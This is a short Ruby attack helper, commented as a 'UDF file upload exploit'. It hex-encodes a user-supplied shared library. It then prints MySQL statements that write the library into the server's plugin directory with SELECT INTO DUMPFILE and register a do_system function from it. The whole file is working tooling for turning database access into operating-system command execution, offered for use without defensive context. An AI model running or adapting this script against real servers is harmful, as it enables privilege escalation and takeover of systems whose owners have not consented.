#!/usr/bin/env ruby
#unpacks data for UDF file upload exploit
require 'securerandom'

#pass me the .so file you created
soname = SecureRandom.alphanumeric(8)
data = File.read(ARGV[0])
blob = "0x"
blob << data.unpack("C*").map {|x| "%02x" % [x]}.join
puts "SELECT #{blob} into DUMPFILE '/usr/lib/mysql/plugin/#{soname}.so';"
puts "DROP FUNCTION IF EXISTS sys_exec;"
puts "CREATE FUNCTION do_system RETURNS int SONAME '#{soname}.so';"
puts "select * from mysql.func where name = 'do_system';"
